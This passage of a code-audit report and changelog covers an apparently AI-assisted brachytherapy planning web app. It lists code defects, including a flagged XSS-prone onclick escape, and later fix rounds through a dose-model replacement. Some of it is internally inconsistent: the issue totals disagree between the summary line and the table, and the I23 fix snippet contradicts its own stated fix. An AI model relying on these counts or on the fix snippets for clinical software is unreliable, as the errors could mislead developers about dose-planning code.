**Impact:** Users cannot see 3D reconstructions of organs with label IDs >6 (stomach, duodenum, colon, and dozens of other structures). The 3D view is limited to only 6 of the 100+ possible organs, significantly limiting its clinical utility.

**Fix:** Read the actual label IDs from the loaded label data:
```javascript
const ctvLabels = window._ctvLabelMap || {};
const actualLabelIds = Object.keys(ctvLabels).map(Number).filter(k => k > 0);
const labelIds = actualLabelIds.length > 0 ? actualLabelIds : [1, 2, 3, 4, 5, 6];
```

---

## I21. `_applyDoseTextureToMesh` — sequential HTTP requests per vertex

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-layout.js` |
| **Line** | 1008 |
| **Severity** | IMPORTANT — 12,500+ sequential fetches for a single mesh |

**Problem:** The dose texture application loops over every mesh vertex and makes an individual async request per iteration:

```javascript
// viewer-layout.js:1008
for (let i = 0; i < positions.length; i += sampleEvery) {
    const idx = ...;
    const doseNorm = await _sampleDoseNormalizedAtIndex(idx);  // ← 1 HTTP fetch per vertex
    // ...
}
```

For a mesh with 25,000 vertices and `sampleEvery=2`, this makes 12,500 sequential HTTP requests to `/api/planning/dose_overlay_slice`. Even with the `state.doseTexture.rawAxialSlices` cache, spatially distributed mesh vertices across many Z slices will require many unique fetches. At 50ms per request, this takes ~10 minutes.

**Impact:** The 3D dose texture overlay is effectively unusable for any non-trivial mesh. Users who enable "dose texture" mode on the 3D view will experience a multi-minute hang while thousands of sequential HTTP requests complete.

**Fix:** Batch the requests by Z-slice:
```javascript
// Group vertices by Z-slice, fetch each slice once
const sliceRequests = {};
for (let i = 0; i < positions.length; i += sampleEvery) {
    const zSlice = Math.round(positions[i+2]);
    if (!sliceRequests[zSlice]) {
        sliceRequests[zSlice] = [];
    }
    sliceRequests[zSlice].push(i);
}
// Fetch all unique slices in parallel
const slices = await Promise.all(
    Object.keys(sliceRequests).map(z => fetch(`/api/planning/dose_overlay_slice?z=${z}`).then(r => r.json()))
);
// Apply fetched data to vertices
for (const [z, indices] of Object.entries(sliceRequests)) {
    const sliceData = slices.find(s => s.z == z);
    for (const idx of indices) { ... }
}
```

---

## I22. Orphan `RLock` created via `getattr(agent.memory, "_lock", threading.RLock())`

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 1450 |
| **Severity** | IMPORTANT — TOCTOU race; lock that nobody else uses |

**Problem:** `getattr` with a default creates a NEW `RLock()` every time it's called if the attribute doesn't exist:

```python
# planning_routes.py:1450
with getattr(agent.memory, "_lock", threading.RLock()):
    conv = agent.memory.conversation
    # modify conv
```

If `agent.memory` doesn't have a `_lock` attribute:
1. `getattr` returns a brand new `threading.RLock()` object
2. The `with` block acquires this orphan lock that NO other code knows about
3. The `conversation` is accessed/modified without any real synchronization
4. The orphan lock is released after the block and garbage collected

This is a TOCTOU (Time Of Check To Time Of Use) race condition — between the `getattr` call and the `with` block, another thread could be accessing `conversation` simultaneously.

**Impact:** In multi-threaded environments, concurrent access to `agent.memory.conversation` is not properly synchronized, leading to potential data corruption. The "lock" provides false confidence.

**Fix:** Always use the real lock or accept the risk explicitly:
```python
memory_lock = getattr(agent.memory, "_lock", None)
if memory_lock:
    with memory_lock:
        ...
else:
    # No lock available — document the race risk
    ...
```

---

## I23. Overlay mask computed on raw HU, rendered on windowed image

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 219 |
| **Severity** | IMPORTANT — threshold overlay invisible when window excludes the range |

**Problem:** The threshold overlay mask is computed on raw Hounsfield Unit data, but rendered on top of a windowed/leveled grayscale image:

```python
# viewer_routes.py:219
mask = ct_data > threshold      # computed on raw HU values

# Later: slice_rgb is the windowed image (window center/width applied)
slice_rgb[mask_slice, 0] = ...  # overlay applied over windowed data
```

If the user sets the window center/width to values that exclude the threshold range (e.g., window=1500, level=-500 for lung imaging, threshold=-200 for bone), the highlighted overlay region appears on an invisible or near-uniform background. For example, threshold=-200 (bone) with lung window (level=-500, width=1500) means bone pixels are rendered as white, but the overlay is a colored tint on white pixels — barely visible.

**Impact:** Users who adjust the window/level may find that threshold-based overlays become invisible. The overlay appears to disappear, confusing the user.

**Fix:** Apply the window/level to `ct_data` first, then compute the mask on the same data:
```python
# Apply window/level to ct_data:
ct_windowed = np.clip((ct_data - level) / width + 0.5, 0, 1)
# Compute mask on the original HU data (NOT windowed):
mask = ct_data > threshold
# Apply overlay on windowed data:
slice_rgb[mask_slice, 0] = overlay_color
```

---

## I24. Zero test coverage for `agent_runtime/` and `web/routes/`

| Field | Value |
|-------|-------|
| **File** | Entire project |
| **Severity** | IMPORTANT — no regression safety for core modules |

**Problem:** After the modularization, two critical module groups have ZERO unit tests:
- `agent_runtime/` (5 files, 6600+ lines): Core agent logic including LLM function calling, tool execution, response formatting, chat workflows
- `web/routes/` (2 files, 3300+ lines): All API route handlers including planning, viewer, export, and UI bridge endpoints

The existing tests (`tests/test_brain_system.py`) test the OLD architecture's `brain/` module, which is separate from the new core.

**Impact:** Any refactoring or bug fix in `agent_runtime/` or `web/routes/` must be verified manually. There are no automated regression guards. The C1, C2, C3, C7, C8, C9, C10 bugs (all CRITICAL or HIGH) discovered in this review would have been caught by basic unit tests.

**Fix:** Add unit tests for at minimum:
1. `AgentMemory` operations (store, retrieve, clear, compact)
2. `ToolResultPipeline.format()` with various tool results
3. Each major chat workflow path
4. Each API route handler (via Flask test client)

---

## I25. `{current_date}` never replaced in system prompt (duplicate of C12)

This is a duplicate reference to issue C12. The `{current_date}` template variable in `system_prompt.md:2` is at risk of not being replaced depending on the code path that loads it. See C12 for full details.

---

# MINOR (30)

---

## M1. Unused imports across `agent_runtime/`

**File:** `agent_runtime/response_tools.py` — unused:
- `base64` (line 8), `io` (line 9), `traceback` (line 16), `datetime` (line 17)
- `unquote`, `urlparse` from `urllib.parse` (line 19)
- `SimpleITK as sitk` (line 22)
- `SYSTEM_PROMPT_TEMPLATE`, `get_prompt_modules` from `config.prompts` (line 24)
- `PlanningPhase` from `agent_runtime.core` (line 25)

**File:** `agent_runtime/chat_workflows.py` — unused:
- `base64` (line 8), `io` (line 9), `datetime` (line 17)
- `unquote`, `urlparse` from `urllib.parse` (line 19)
- `SYSTEM_PROMPT_TEMPLATE`, `get_prompt_modules` from `config.prompts` (line 24)

**File:** `agent_runtime/llm_runtime.py`:
- Duplicate `import datetime` at lines 170 and 305

**Impact:** Littered imports confuse developers about what the module actually needs. The duplicate `datetime` import suggests a merge artifact.

**Fix:** Remove all unused imports. Remove the duplicate `import datetime`.

---

## M2. F-strings in logger calls (~30 occurrences across `agent_runtime/`)

**Examples:**
```python
# core.py:246
logger.warning(f"CTV/OAR array shape mismatch ({ctv_arr.shape} vs {existing_arr.shape}); skipping merge")

# response_tools.py:?
logger.info(f"Tool {tool_name} result: {result}")
```

**Impact:** F-strings in logger calls are always evaluated even when the log level is disabled. For example, `logger.debug(f"Large array: {data}")` always formats the string even if debug level is off. With large numpy arrays, this is a significant performance cost.

**Fix:** Use lazy `%s` formatting:
```python
logger.warning("CTV/OAR array shape mismatch (%s vs %s); skipping merge", ctv_arr.shape, existing_arr.shape)
```

---

## M3. `/api/planning/seeds_3d` route in `viewer_routes.py`

**File:** `web/routes/viewer_routes.py:1044`
**Issue:** The route `/api/planning/seeds_3d` lives in `viewer_routes.py`, not `planning_routes.py`. This is the same grouping as the original monolith, so it's not a regression, but the name `seeds_3d` is planning-related while its file is viewer-related.
**Fix:** Either rename to `/api/viewer/seeds_3d` or move to `planning_routes.py`.

---

## M4. 261 inline `style=""` attributes in `index.html`

**File:** `web/app/index.html`
**Issue:** The CSS split extracted `<style>` blocks into 4 CSS files, but element-level styling is still inlined. For example, every drag handle has:
```html
<div class="..." style="cursor:col-resize;pointer-events:auto !important;isolation:isolate;transform:translateZ(0);">
```
**Impact:** Makes the HTML harder to read, maintains, and change. Inline styles cannot be overridden by user themes without `!important`.
**Fix:** Extract into CSS classes.

---

## M5. `.data-tree-*` styles in `report-controls.css`

**File:** `web/app/static/css/brachybot-report-controls.css:1-20`
**Issue:** `.data-tree-container`, `.data-tree-item`, `.data-tree-toggle`, `.data-tree-label` styles define the data tree appearance but are placed in the report controls CSS file instead of `brachybot-panels-viewers.css` where the data tree HTML lives.
**Fix:** Move to `brachybot-panels-viewers.css`.

---

## M6. No `{CT,MR,US}_DATA_ROOTS` env var documentation

**File:** `web/server_support.py` — `_validate_path` uses `BRACHYBOT_CT_DATA_ROOTS`, `BRACHYBOT_MR_DATA_ROOTS`, `BRACHYBOT_US_DATA_ROOTS` environment variables to expand allowed read paths. These are not documented in any README or startup guide.
**Fix:** Add to README or startup documentation.

---

## M7. `_global_agent` singleton overwritten by multiple instances

**File:** `AgenticSys.py:92-98`
**Issue:** The module-level singleton `_global_agent` is set by every `BrachyAgent` instance, with the last one winning. In multi-session deployments, tools like `planning_pipeline.py` that read `AgenticSys._global_agent` get the wrong session's agent. This is documented in the code as intentional but is fragile.
**Fix:** Use dependency injection instead of a global singleton.

---

## M8. `_clean_response_text` — 27 stacked `re.sub` calls

**File:** `agent_runtime/llm_runtime.py:759-885`
**Issue:** 27 sequential `re.sub` calls, many of which overlap. O(n*m) processing of every LLM response. Maintenance hazard (see H12 for specific bugs).
**Fix:** Consolidate into ~10 focused patterns.

---

## M9. Auto-generated API key never used

**File:** `web/server_support.py:56-59`
**Issue:** When `BRACHYBOT_API_KEY` is unset and `BRACHYBOT_TRUST_NETWORK` is unset, `API_KEY` is set to `secrets.token_urlsafe(32)`, but `_API_KEY_REQUIRED` stays `False`. The generated key is never used — the auth decorator always short-circuits to `True`.
**Fix:** Either generate and enforce the key, or don't generate it.

---

## M10. JSON parse fragility from single-quote replacement

**File:** `agent_runtime/chat_workflows.py:73`
Same issue as H11 but noted again as the mechanism is fragile beyond the apostrophe case. The `replace("'", '"')` approach should be replaced with `ast.literal_eval`.

---

## M11. No retry on LLM API failure

**File:** `agent_runtime/llm_runtime.py:351-355`
**Issue:** Both streaming and non-streaming paths catch `Exception` from the LLM API call and immediately return/die. No exponential backoff, no retry. A transient network error (DNS, TLS renegotiation, server-side throttling) ends the user's session.
**Fix:** Add retry with exponential backoff (3 attempts, 1s/2s/4s delay).

---

## M12. `AgentMemory.clear_conversation()` has dead code for `exp_memory`

**File:** `agent_runtime/core.py:496-498`
**Issue:**
```python
if hasattr(self, 'exp_memory') and self.exp_memory:
    self.exp_memory.clear()
```
`AgentMemory` never sets `self.exp_memory` — it's on `BrachyAgent`. This condition is always `False` when called on `AgentMemory`. Dead code.
**Fix:** Remove.

---

## M13. `agent_runtime/__init__.py` doesn't export mixin classes

**File:** `agent_runtime/__init__.py:1-5`
**Issue:** Only exports `AgentMemory`, `PlanningPhase`, `ToolRegistry`, `ToolResultPipeline` from `core.py`. Does not export `ResponseToolMixin`, `LLMRuntimeMixin`, `ChatWorkflowMixin` from the other modules. These are imported directly by `AgenticSys.py` via the full module path, so it works, but the package's public API is incomplete.
**Fix:** Add mixin classes to `__all__`.

---

## M14. `_todoI18n` referenced in `chat-core.js` before definition in `chat-todo.js`

**File:** `web/app/static/js/brachybot-chat-core.js:1814`
**Issue:** `_todoI18n()` is called in `updateToolProgress` (defined in `chat-core.js`) but `_todoI18n` is only defined in `chat-todo.js:25`. The script load order (chat-core → chat-todo) means the function doesn't exist when `chat-core.js` parses. However, `updateToolProgress` is only called at runtime (not parse time), and by then `chat-todo.js` has loaded. The `try/catch` around the call makes this safe but fragile.
**Fix:** Define `_todoI18n` in `chat-core.js` alongside `_footerI18n`, or ensure a default exists.

---

## M15. `_TODO_LABELS` and `GENERIC_TEMPLATES` dead code in `chat-todo.js`

**File:** `web/app/static/js/brachybot-chat-todo.js:29-37, 567-574`
**Issue:** `_TODO_LABELS` (lines 29-37) and `GENERIC_TEMPLATES` (lines 567-574) are defined as module-level constants but are never referenced anywhere. All their logic is handled by `_todoLabelForStep()` and `_planningTemplates()` respectively.
**Fix:** Remove dead code.

---

## M16. No `"use strict"` in 10/11 JS files

**Files:** All `brachybot-*.js` files except `report-shell.js:14`
**Issue:** 10 of 11 split JS files run in sloppy mode. In an 11-file global-scope architecture, accidental assignment to an undeclared variable creates a silent global instead of throwing `ReferenceError`.
**Fix:** Add `"use strict";` at the top of every file.

---

## M17. Infinite `requestAnimationFrame` render loop

**File:** `web/app/static/js/brachybot-3d-manual.js:463-498`
**Issue:** `animate()` calls `requestAnimationFrame(animate)` unconditionally — never stops. Re-renders the scene at 60fps even with zero interaction or mesh changes.
**Fix:** Only run loop when scene has pending updates; stop on idle.

---

## M18. Hardcoded welcome message bypasses i18n toggle

**File:** `web/app/static/js/brachybot-chat-core.js:149,257,1718`
**Issue:**
```javascript
// Line 149
addChat('system', 'Welcome to BrachyBot. Describe your brachytherapy case...');
// Line 1718
text.textContent = 'Thinking';
```
These strings have no `data-i18n-zh`/`data-i18n-en` attributes. When user toggles EN→中, these stay English.
**Fix:** Use `_t()` or i18n-aware mechanism for all user-visible strings.

---

## M19. Three parallel i18n systems coexist

| System | Mechanism | Scope |
|--------|-----------|-------|
| `data-i18n-*` attributes | `applyI18n()` in chat-core.js | HTML static labels |
| `_TODO_I18N` / `_setActiveTodoLang` | chat-core.js:1864, chat-todo.js:1 | Todo dock labels |
| `REPORT_STRINGS` | report-editor.js | Report form labels |

**Fix:** Consolidate into a single system.

---

## M20. No pytest configuration — `pytest-asyncio` not listed

**File:** Project root
**Issue:** No `pytest.ini`, `pyproject.toml`, `setup.cfg`, or `.coveragerc`. `pytest-asyncio` is needed for async tests but not listed in `requirements.txt`.
**Fix:** Add `pytest.ini` with async support and add `pytest-asyncio` to `requirements.txt`.

---

## M21. `websocket_clients` dead variable

**File:** `web/server.py:89-95`
**Issue:** `websocket_clients = []` is defined but never read or written elsewhere.
**Fix:** Remove.

---

## M22. `first_url` dead variable

**File:** `agent_runtime/llm_runtime.py:269,1224`
**Issue:** `first_url = ""` is assigned but never read.
**Fix:** Remove.

---

## M23. `normalize_dose_image` — output range = window range (misleading name)

**File:** `web/server_support.py:600-606`
**Issue:** `normalize_dose_image` is called with `output_min = window_min` and `output_max = window_max`, making it a clamp operation, not a normalization.
**Fix:** Rename to `clamp_dose_image` or document the behavior.

---

## M24. Worktree copies of tests may diverge

**File:** `.claude/worktrees/*/tests/test_brain_system.py`
**Issue:** Each worktree has its own `test_brain_system.py` and `conftest.py`. If divergent, could mask regressions.
**Fix:** Remove stale worktrees or symlink to the canonical test files.

---

## M25. SHA256 of API key used instead of `hmac.compare_digest`

**File:** `web/server_support.py:947-949`
**Issue:** API key comparison uses `hashlib.sha256(key.encode()).hexdigest()` instead of `hmac.compare_digest` directly. Leaks that the stored form is a hex digest.
**Fix:** Use constant-time HMAC comparison.

---

## M26. `_safe()` helper defined inside `api_upload` — redefined per request

**File:** `web/server.py:187-190`
**Issue:** `_safe` function is defined inside the route handler, creating a new function object on every upload request.
**Fix:** Move to module level.

---

## M27. Duplicate key `toolMeasure` in `viewer-layout.js` tooltips

**File:** `web/app/static/js/brachybot-viewer-layout.js:38-39`
**Issue:** `'toolMeasure'` appears twice in the same object literal. The second value overwrites the first (both identical, so no functional impact).
**Fix:** Remove the duplicate line.

---

## M28. `resampleRatio = 0` division risk in `_displayYToVolumeZ`

**File:** `brachybot-viewer-layout.js`
**Issue:** `_displayYToVolumeZ` divides by `resampleRatio` which could theoretically be 0. Currently guarded by `Math.max(spacingZ / spacingY, 0.01)` in `_getMprGeometry`, but the guard is in a different function.
**Fix:** Add defensive `Math.max(ratio, 0.01)` inside `_displayYToVolumeZ` itself.

---

## M29. `sources.badgeHtml` — double-quote injection in onclick

**File:** `web/app/static/js/brachybot-report-shell.js:171`
**Issue:**
```javascript
onclick="Report.sources.resetTo('${(key || '').replace(/'/g, "\\'")}')"
```
Only single quotes are escaped. If `key` contains `"`, it breaks out of the `onclick` HTML attribute. `key` comes from report form field names (hardcoded), so currently safe, but XSS vector if keys become user-controllable.
**Fix:** Also escape `"` and `&`:
```javascript
.replace(/'/g, "\\'").replace(/"/g, "&quot;")
```

---

## M30. `consistencyCheck.compare` — duplicate key in object literal

**File:** `web/app/static/js/brachybot-chat-todo.js:1107-1109`
**Issue:** Duplicate key `name` in an object literal. The second value overwrites the first.
**Fix:** Remove the duplicate.

---

# Summary

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **CRITICAL** | 18 | Missing imports, path traversal, lock-free rate limiter, `str.format()` crash, triple tool storage, `const` SyntaxError, CSS orphans, CSS undefined classes, operator precedence bugs, regex over-matching, template variable not replaced |
| **HIGH** | 22 | Unhandled AttributeError, CSS syntax error, missing cancel check, CT gate inconsistency, bare except, path validation bypass, 413 HTML response, WET constant, missing dependency, stale worktrees, fragile JSON parse, dead regex condition, dual implementations, int16 overflow, O(n) eviction, import in loop, duplicate route, font rendering, dual i18n systems, cache key collision, unlogged 500, None crash |
| **IMPORTANT** | 25 | Wrong memory key, dead parameter, console.log, dead state, wrong tool name, print(), too-narrow check, organ count sort, array leak, forEach null guard, undefined function refs, triplicated auto-OAR, duplicated LLM loops, dead conversion, repetitive pattern, builtins pollution, hardcoded path, lost promise, screenshot race, hardcoded label IDs, sequential HTTP, orphan RLock, overlay mismatch, zero test coverage |
| **MINOR** | 30 | Unused imports, f-string logging, inconsistent naming, inline styles, misplaced CSS, undocumented env vars, singleton fragility, regex churn, dead API key, fragile JSON, no retry, dead code, incomplete package API, cross-file dependency, dead constants, no strict mode, infinite rAF, i18n bypass, triple i18n, no pytest config, dead variables, misleading function name, divergent test copies, SHA256 leak, inner function allocation, duplicate object key, division guard, XSS vector, duplicate key |

---

## Route Count Verification

| Source | Count |
|--------|-------|
| `web/server.py` | 6 |
| `web/routes/planning_routes.py` | 38 |
| `web/routes/viewer_routes.py` | 12 |
| **Total** | **56** ✅ (matches monolith) |

## Static Resource Verification

| Check | Result |
|-------|--------|
| CSS `<link>` refs in index.html | 5 (all exist) |
| JS `<script>` refs in index.html | 21 (all exist) |
| brachybot-*.js refs | 11 (all exist) |
| brachybot-*.css refs | 4 (all exist) |
| **Missing refs** | **0** ✅ |

## Verification Status

| Check | Result |
|-------|--------|
| py_compile (all .py files) | 206/206 ✅ |
| node --check (frontend JS) | All pass ✅ |
| `from web.server_support import *` residual | 0 ✅ |
| Route registration smoke | 56/56 ✅ |
| Static resource refs | 26 refs, 0 missing ✅ |
| Unittest discover | 13 tests, 9 pass, 4 skip (missing SimpleITK) ✅ |

---

*Report updated 2026-07-10. ~145 total issues found across 5 rounds: 18 CRITICAL, 32 HIGH, 44 MEDIUM, 51 LOW.*

---

## 2026-07-13 — Round 8: UI state planning parameters take effect

**Audit base:** `37d3ae8`

**Problem:** The Web UI exposes editable seed/radiation/optimization parameters (e.g. `in_lowest_energy`, `dvh_rate`, `max_iter`, `distance_filter`, `seed_info`, `radiation_params`, etc.) but changing them in the UI and running planning had no effect — the backend always used the default values from `agent.config`.

**Root cause:** The `planning` block in `collectUIState()` only sent `reference_direc`. The backend read planning params exclusively from `agent.config` defaults.

### Changes

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-ui-api.js` | Added `plan_mode`, `seed_info`, `radiation_params`, `in_lowest_energy`, `out_highest_energy`, `dvh_rate`, `max_iter`, `iter_rate`, `replan_rate`, `distance_filter` to the `planning` block in `collectUIState()`. |
| `AgenticSys.py` | `_normalize_clinical_tool_calls()` now reads all planning params from `ui_state.planning` (with fallback to `agent.config`) and passes them as kwargs to `planning_pipeline`. |
| `web/routes/planning_routes.py` | `api_planning_run` reads all params from `ui_state.planning` first, falling back to `agent.config`. |
| `AgenticSys.py` | Fixed key name mismatch: `max_candi_traj` → `maximum_candidate_trajectories`. |

### Verification

- `py_compile`: all modified files pass.
- `node --check`: `brachybot-ui-api.js` passes.
- Manual: restart server, change a parameter in the UI, run planning — the new value is used by the backend.`

## Round 9 Fixes (2026-07-13)

The following seven reported behaviors were rechecked against the current code and fixed only where the defect was reproducible in the implementation:

| Area | Verified cause | Fix |
|------|----------------|-----|
| Manual needle editing | Endpoint hits were allowed to reach OrbitControls after the capture-phase hit test. | Endpoint selection now stops the competing event, preserving camera orbit for non-handle clicks; endpoint updates still flow through the existing manual replan path. |
| DVH tooltip | The tooltip mixed Plotly SVG `_size` pixels with CSS-scaled container pixels. | Tooltip conversion now uses the rendered Plotly plot overlay rectangle and maps both axes in the same viewport coordinate system. |
| Figure 1 black capture / missing OARs | Figure 1 visibility/material restoration was not guaranteed when WebGL capture or canvas composition failed. | Figure 1 saves camera and mesh state and restores it in `finally`; Figure 2 dose-surface capture has the same unconditional restoration guard. A report status message confirms viewer restoration. |
| Dose colorbar dialog | The existing popup had no explicit close affordance and could cover its toggle button. | Added close button, outside-click dismissal, and Escape dismissal. Existing defaults and 2D/3D scope behavior are unchanged. |
| Todo breathing animation | `markActive()` demoted every earlier active step to `pending`, stopping its animation and timer. | Unfinished active rows remain active until their own done/error event, supporting parallel long-running steps. |
| Review language | Quality-gate labels and deterministic review text were always formatted in English; completeness output had the same issue. | Chinese review labels, deterministic plan-review messages, and completeness concerns/suggestions now follow the detected conversation language. English behavior is unchanged. |

### Verification

- `node --check` passes for the four modified viewer/report JavaScript files.
- `py_compile` passes for the three modified review Python modules.
- `tests/test_round9_regressions.py`: 6 tests passed with the standard-library `unittest` runner.
- `git diff --check` passes.

## Round 13 Fixes (2026-07-13)

### Viewer refreshes unexpectedly reset the 3D camera

**Verified cause:** The defect was reproducible in several non-user camera paths. `addManualNeedle()`, the 3D `ResizeObserver`, and `forceRender3DViewer()` all called `fitCameraToScene()`. Data-tree reconstruction and seed/needle refreshes call these paths, so an otherwise harmless redraw replaced the operator's current orbit, zoom, and target. Report-only captures also changed the camera temporarily and did not restore the exact pose in every path.

**Fix:**

- Manual needle insertion, resize, late-layout retry, data-tree reconstruction, WebGL restoration, and ordinary 3D refresh now resize or redraw only; they never fit the camera.
- The only normal camera-fitting entry points are the explicit `3d.fit` and `3d.reset` actions. The existing Fit/Reset controls remain available.
- Report Figure 1, Figure 2, and post-planning 3D recapture save position, quaternion, clipping range, aspect, and OrbitControls target, then restore them after the temporary capture view.
- The current 2D slice indices remain state-driven; no automatic slice reset was found in this audit.

### Needle endpoint dragging conflicted with OrbitControls

**Verified cause:** Endpoint hit testing used the surrounding viewer card rectangle instead of the actual WebGL canvas, and the endpoint event could still reach OrbitControls. This made the camera rotate when the operator attempted to drag a needle endpoint.

**Fix:** Endpoint handles are now raycast against the actual renderer canvas using corrected NDC coordinates. A capture-phase `pointerdown`/`mousedown` guard wins before OrbitControls, disables camera controls during the edit, uses pointer capture so movement outside the canvas is retained, previews the updated shaft without recreating the handles, and commits through the existing `onManualNeedleHandleEdited()` replan path on release. Non-handle clicks retain normal rotate/pan/zoom behavior.

### Verification

- `node --check` passes for all modified viewer, planning, report, and UI API JavaScript files.
- `tests/test_round9_regressions.py`: 16 tests pass with the standard-library `unittest` runner.
- `git diff --check` passes.
- Browser/GPU interaction was not available in this local Windows workspace; after deployment, verify endpoint dragging and camera persistence on the RTX server with an actual WebGL session.

## Round 12 Fixes (2026-07-13)

### Screenshot requests and visual answers

**Verified causes:** A generic dose-distribution request could be narrowed by the model to `viewer-axial`, even though the product's report convention is three planes plus DVH. A screenshot tool acknowledgement was also treated as the answer: the uploaded browser image was not sent back as multimodal context for the requested explanation. Finally, duplicate screenshot tool rounds could produce repeated axial tiles.

**Fixes:**

- `ui_screenshot` and the browser interceptor normalize an unspecified dose-distribution request to `dose-overview`, which captures axial, sagittal, coronal, colorbar, and DVH in one report-style image. Explicit axial-only requests remain axial-only.
- Screenshot completions are deduplicated per logical target/question and grouped in one gallery panel.
- Explanation/analysis requests queue one hidden multimodal follow-up containing the uploaded screenshot URL. The follow-up explicitly forbids another screenshot and is included in the completeness-review decision.
- The LLM runtime deduplicates `ui_screenshot` for the whole turn and ends a screenshot-only tool round after the capture request, preventing a redundant second screenshot loop.

### 3D viewer becoming black or empty

**Verified causes:** The agent received no compact telemetry for mesh count, visibility, canvas layout, or WebGL context state, so an empty viewer could not be diagnosed. Camera fitting also included hidden stale meshes, and a lost WebGL context had no restore path.

**Fixes:**

- `collectUIState()` now reports renderer initialization, mesh/visible-mesh counts, canvas and renderer dimensions, and `context_lost`; `AgentMemory.get_ui_state_summary()` exposes the same facts to the agent.
- 3D status questions have a deterministic evidence-based fallback that distinguishes no meshes, all objects hidden, zero-sized layout, and unresolved WebGL state without inventing a cause.
- `forceRender3DViewer()` performs a conservative all-hidden recovery only when data-tree state says objects should be visible; partially hidden user configurations are preserved.
- Camera fitting ignores hidden meshes and hidden skin, avoiding a stale hidden object changing the framing.
- WebGL context loss/restoration is observed and restoration schedules a fresh resize/render.
- Figure 1 report capture now saves/restores surface-child material state as well as group visibility, preventing OAR meshes from remaining hidden after report capture.

### Verification

- `py_compile`: all modified Python files pass.
- `node --check`: modified chat, UI API, 3D, viewer-layout, and report-editor JavaScript files pass.
- `tests/test_round9_regressions.py`: 12 tests pass with the standard-library `unittest` runner.
- `git diff --check` passes.
- Full browser/GPU execution was not available in this local Windows workspace; WebGL behavior should still be smoke-tested on the RTX server after deployment.

## Round 11 Fixes (2026-07-13)

### Execution Trace showed inflated totals such as 18/115

**Verified cause:** The browser appended every SSE `step` event to the raw `steps` array. A single logical step is emitted multiple times during its lifecycle (pending, heartbeat/progress update, and done). The trace body deduplicated these events, but `updateChainHeader()` counted the raw array, so its denominator represented transport events rather than real workflow steps.

**Fix:** The header now builds a latest-state map keyed by backend step ID, with a type/tool/parent/title fallback when an ID is absent. It counts the same deduplicated logical steps shown in the trace. The example is expected to become approximately `18/19` while the final LLM step is still pending, rather than `18/115`.

### Verification

- `brachybot-chat-core.js`: `node --check` passes.
- Round 9/10/11 regression suite: 8 tests pass with `unittest`.
- `git diff --check` passes.
- The repository's `pytest` executable was unavailable in the local Windows runtime; this is an environment limitation, not a test failure.

## Round 10 Fixes (2026-07-13)

### Missing tumor-site clarification incorrectly continued the workflow

**Verified cause:** CTV segmentation already returned `metadata.clarification_required` and a clarification question when `tumor_type` was absent. The LLM runtime stopped only the current tool-call batch, but did not set its outer `_input_missing` guard or final response. The next LLM iterations therefore continued and the UI remained in a running state.

**Fix:** Both streaming and non-streaming tool loops now promote clarification metadata to an input-waiting terminal response, mark the step with `requires_input`, and stop before any OAR/planning tool or extra LLM round can run. The explicit missing-`tumor_type` interception follows the same path.

### Running progress animation stopped early

**Verified cause:** Active Todo rows could be redrawn by later SSE events without preserving the CSS animation state; error events matched against predicted rows were also not handled in the deduplication branch.

**Fix:** Error/clarification events now terminate the matching active row. Active rows receive a lightweight state guard that keeps the active class and `animation-play-state` alive until done/error. Todo, pipeline, and execution-trace pending animations explicitly use infinite running animation state.

### Verification

- `agent_runtime/llm_runtime.py`: `py_compile` passes.
- `brachybot-chat-todo.js`: `node --check` passes.
- Round 9/10 regression suite: 7 tests pass with `unittest`.
- `git diff --check` passes.

## Round 14 Dose Engine Replacement (2026-07-14)

### Verified issue: BrachyBot still loaded the retired dose model

The repository was still resolving `plans/dose_pre/dose_model.pth`, importing the
old `myDoseNet` architecture, and preparing fixed 32³ crops with the previous
conditioning helpers. This was a real integration defect: the newly trained
checkpoint is a different architecture and requires spacing-normalized physical
preprocessing. Replacing only the checkpoint would therefore either fail state
loading or silently produce invalid dose inputs.

### Implemented fix

- Added the canonical `DoseUNet` implementation in
  `plans/dose_pre/dose_unet.py`, matching the training source exactly:
  five feature widths `(16, 32, 64, 128, 256)`, InstanceNorm3d blocks,
  transpose-convolution decoder, replicate padding, and Softplus output.
- Added `plans/dose_pre/inference.py` implementing the deployed contract:
  physical 12 cm seed-centered crop, target-spacing resampling (1 mm),
  channel order `line_map -> ct -> soft_pos`, 64³ sliding-window averaging,
  checkpoint `dose_multiplier` reversal, and resampling back to the original
  CT grid.
- Reworked `plans/dose_pre/model_loader.py` to use one canonical identity and
  path: `dose_unet_spacing1mm` at
  `models/dose_unet_spacing1mm/best_model.pth`. Loading now validates
  `model_state_dict`, channel order, target spacing, and dose multiplier, and
  attaches the contract to the model. Legacy caller feature arguments cannot
  select the retired network.
- Kept the existing external `(z, y, x)` voxel and LPS direction interfaces.
  Conversion to physical position/direction occurs only inside the new dose
  adapter, so the established viewer/planner coordinate chain is unchanged.
- Removed the old model implementation, old crop predictor, and duplicate
  wrappers from both `plans/dose_pre/` and `dose_pre/`. No dose checkpoint is
  committed to Git; the deployed checkpoint is installed separately on the
  RTX host because repository ignore rules intentionally exclude model files.
- Updated planning, manual replanning, UI metadata, configuration defaults,
  tests, and documentation to use the same model name and 64³ inference
  setting. `DoseImageContext` now caches only immutable grid metadata and no
  longer materializes the retired full-volume normalization.

### Deployment and unit boundary

The remote checkpoint was verified as the requested file, with checkpoint
metadata `channel_order=[line_map, ct, soft_pos]`, `target_spacing=[1,1,1]`,
and `dose_multiplier=1e12`. The supplied upstream predictor was also run for
one test particle: it produced the expected raw dose output after dividing by
the training multiplier. BrachyBot therefore treats the adapter output as the
model dose array and retains the existing explicit report calibration boundary;
the independent clinical dose verification requirement remains unchanged.

### Verification

- Modified Python modules pass `py_compile` after clearing the broken local
  `PYTHONHOME/PYTHONPATH` environment overrides.
- `git diff --check` passes.
- The RTX environment loaded the new checkpoint and the upstream predictor
  completed a one-particle smoke test using the new 1 mm preprocessing.
- Full clinical planning and WebGL execution require the RTX runtime and are
  recorded as deployment smoke tests, not replaced by local syntax checks.

### Round 14 unit-boundary addendum

The adapter does not use the retired analytical model. The upstream predictor
divides the neural-network output by the checkpoint's `dose_multiplier`; that
raw value is numerically too small for BrachyBot's established normalized
planning threshold. `model_loader.py` therefore records an explicit
`planning_output_scale`, defaulting to the same checkpoint multiplier and
optionally overridden by `BRACHYBOT_DOSE_MODEL_PLANNING_SCALE`. `inference.py`
